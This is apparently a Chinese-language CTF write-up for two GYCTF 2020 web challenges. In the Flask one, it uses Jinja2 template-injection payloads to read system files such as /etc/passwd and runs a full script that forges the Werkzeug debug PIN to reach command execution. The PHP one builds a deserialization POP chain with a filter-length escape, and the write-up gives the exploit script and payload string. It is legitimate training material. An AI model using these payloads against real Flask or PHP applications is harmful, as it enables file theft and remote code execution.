# GYCTF 2020

## FlaskApp

进入是个Flask的base64加密解密页面

考虑SSTI咯

试了一下``base64decode(base64encode({{1+1}}))``会返回2

然后就开始找

```python
{{().__class__.__bases__[0].__subclasses__()[0].__init__}}
````

哪个被重载发现75可以用

```
结果 ： &lt;function _ModuleLock.__init__ at 0x7f070fc12290&gt;
```

然后就是``__globals__.__builtins__[]``

发现eval不能用,用open可以读,但是似乎flag也被过滤了，

```python
{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open']("/etc/passwd").read()}}
```

这个时候也发现存在报错界面，提示了是在调试模式，考虑拿Flask的PIN

需要拿到：
> username:就是启动这个Flask的用户
>
> modname为flask.app
>
> getattr(app, '__name__', getattr(app.__class__, '__name__'))为Flask
>
> getattr(mod, '__file__', None)为flask目录下的一个app.py的绝对路径
>
>uuid.getnode()就是当前电脑的MAC地址，str(uuid.getnode())则是mac地址的十进制表达式
>
>get_machine_id() /etc/machine-id或者 /proc/sys/kernel/random/boot_i中的值
> 
>假如是在win平台下读取不到上面两个文件，就去获取注册表中SOFTWARE\\Microsoft\\Cryptography的值
>假如是Docker机 那么为 /proc/self/cgroup docker行

通过``open().read()``拿到这些值

```
username: flaskweb // /etc/passwd
modname: flask.app
getattr(app, '__name__', getattr(app.__class__, '__name__')):Flask
getattr(mod, '__file__', None): /usr/local/lib/python3.7/site-packages/flask/app.py //报错信息
uuid.getnode():  str(02:42:ae:01:17:04)=2485410404100 // /sys/class/net/eth0/address
get_machine_id(): b7372b2e7d533d8845c8f8d5aa5086ad9f8d5e16693d990ffe49ed4f55c190fd // /proc/self/cgroup
```

跑脚本

```python
import hashlib
from itertools import chain
probably_public_bits = [
    'flaskweb',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.7/site-packages/flask/app.py',
]

private_bits = [
    '2485410404100',
    'b7372b2e7d533d8845c8f8d5aa5086ad9f8d5e16693d990ffe49ed4f55c190fd'
]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv =None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                          for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)
```

然后在报错界面就可以执行任意代码了

```python
import os
os.popen("ls /").read()
```

## 参考资料

Flask debug pin安全问题：

https://xz.aliyun.com/t/2553

## Easyphp

扫目录可以扫出源码``www.zip``

考察POP链+尾部逃逸

首先是很明显的尾部逃逸

```php
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
class User{
    ...
    public function getNewInfo(){//
        $age=$_POST['age'];
        $nickname=$_POST['nickname'];//可以构造 len(payload)*"union"+payload 来覆盖Ctrl
        return safe(serialize(new Info($age,$nickname)));
    }
    ...
}
```

这就造成nickname可控，然后找POP链

```php
<?php
error_reporting(0);
session_start();
function safe($parm){
    $array= array('union','regexp','load','into','flag','file','insert',"'",'\\',"*","alter");
    return str_replace($array,'hacker',$parm);
}
class User
{
    public $id;
    public $age=null;
    public $nickname=null;
    public function login() {
        if(isset($_POST['username'])&&isset($_POST['password'])){
            $mysqli=new dbCtrl();
            $this->id=$mysqli->login('select id,password from user where username=?');
            if($this->id){
            $_SESSION['id']=$this->id;
            $_SESSION['login']=1;
            echo "你的ID是".$_SESSION['id'];
            echo "你好！".$_SESSION['token'];
            echo "<script>window.location.href='./update.php'</script>";
            return $this->id;
            }
        }
    }
    public function update(){//0<-
        $Info=unserialize($this->getNewinfo());//5->
        $age=$Info->age;
        $nickname=$Info->nickname;
        $updateAction=new UpdateHelper($_SESSION['id'],$Info,"update user SET age=$age,nickname=$nickname where id=".$_SESSION['id']);//4->
        //这个功能还没有写完 先占坑
    }
    public function getNewInfo(){//5<-
        $age=$_POST['age'];//len(payload)*"union"+payload(nickname)
        $nickname=$_POST['nickname'];
        return safe(serialize(new Info($age,$nickname)));//6->
    }
    public function __destruct(){
        return file_get_contents($this->nickname);//危 //没得输出利用
    }
    public function __toString()//3<-
    {
        $this->nickname->update($this->age);//1-> (nickname = Info)
        return "0-0";
    }
}
class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname){
        $this->age=$age;
        $this->nickname=$nickname;
    }
    public function __call($name,$argument){//1<-
        echo $this->CtrlCase->login($argument[0]);//2-> (CtrlCase Login) age=sql
    }
}
Class UpdateHelper{
    public $id;
    public $newinfo;
    public $sql;
    public function __construct($newInfo,$sql){
        $newInfo=unserialize($newInfo);
        $upDate=new dbCtrl();
    }
    public function __destruct()//4<-
    {
        echo $this->sql;//3-> (__toStrings()) sql = User
    }
}
class dbCtrl
{
    public $hostname="127.0.0.1";
    public $dbuser="root";
    public $dbpass="root";
    public $database="test";
    public $name;
    public $password;
    public $mysqli;
    public $token;
    public function __construct()
    {
        $this->name=$_POST['username'];
        $this->password=$_POST['password'];
        $this->token=$_SESSION['token'];
    }
    public function login($sql)
    {
        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
        if ($this->mysqli->connect_error) {
            die("连接失败，错误:" . $this->mysqli->connect_error);
        }
        $result=$this->mysqli->prepare($sql);
        $result->bind_param('s', $this->name);
        $result->execute();
        $result->bind_result($idResult, $passwordResult);
        $result->fetch();
        $result->close();
        if ($this->token=='admin') {
            return $idResult;
        }
        if (!$idResult) {
            echo('用户不存在!');
            return false;
        }
        if (md5($this->password)!==$passwordResult) {
            echo('密码错误！');
            return false;
        }
        $_SESSION['token']=$this->name;
        return $idResult;
    }
    public function update($sql)
    {
        //还没来得及写
    }
}
```

分析源码从``update.php``中``update()``传入(0)构造一个可控的``$Info``(5),如果我们想要传入可控的的sql的话，可以把CtrlCase搞成``UpdateHelper``销毁时调用``__destruct()``(4)这时候如果``$sql``是``User``那么触发``__toString()``(3)如果``nickname = Info``则触发(1)然后``CtrlCase``为一个``dbCtrl``则可以执行``sql``也即``$age``(2)

然后可以根据POP链写出初步的Exp

```php
<?php
class dbCtrl
{
    public $hostname="127.0.0.1";
    public $dbuser="root";
    public $dbpass="root";
    public $database="test";
    public $name="admin";
    public $password;
    public $mysqli;
    public $token="admin";

    public function login($sql)
    {
        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);
        if ($this->mysqli->connect_error) {
            die("连接失败，错误:" . $this->mysqli->connect_error);
        }
        $result=$this->mysqli->prepare($sql);
        $result->bind_param('s', $this->name);
        $result->execute();
        $result->bind_result($idResult, $passwordResult);
        $result->fetch();
        $result->close();
        if ($this->token=='admin') {
            return $idResult;
        }
        if (!$idResult) {
            echo('用户不存在!');
            return false;
        }
        if (md5($this->password)!==$passwordResult) {
            echo('密码错误！');
            return false;
        }
        $_SESSION['token']=$this->name;
        return $idResult;
    }
}

$dbc= new dbCtrl();

class Info{
    public $age;
    public $nickname;
    public $CtrlCase;
    public function __construct($age,$nickname){
        $this->age=$age;
        $this->nickname=$nickname;
    }
}

$info=new Info("233","233");
$info->CtrlCase = $dbc;

class User
{
    public $id;
    public $age;
    public $nickname;
}

$usr = new User();
$usr->age ="select password,id from user where username=?";
$usr->nickname=$info;

Class UpdateHelper{
    public $id;
    public $newinfo;
    public $sql;
    public function __construct($newInfo,$sql){
        $newInfo=unserialize($newInfo);
        $upDate=new dbCtrl();
    }
}

$upd = new UpdateHelper("233","233");
$upd->sql = $usr;

$info2=new Info("1","233");
$info2->CtrlCase=$upd;

echo serialize($info2);
//O:4:"Info":3:{s:3:"age";s:1:"1";s:8:"nickname";s:3:"233";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";s:3:"233";s:8:"nickname";s:3:"233";s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";N;s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}

?>
```


```
payload="""";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:45:"select password,id from user where username=?";s:8:"nickname";O:4:"Info":3:{s:3:"age";s:3:"233";s:8:"nickname";s:3:"233";s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:4:"root";s:6:"dbpass";s:4:"root";s:8:"database";s:4:"test";s:4:"name";s:5:"admin";s:8:"password";N;s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}"""

"union"*len(payload)+payload

```
利用尾部逃逸搞一个这样的``Info`` ``"union"*len(payload)+payload``
然后拿到密码md5,这里可以反查出来，当然既然可以任意sql的话还可以直接注,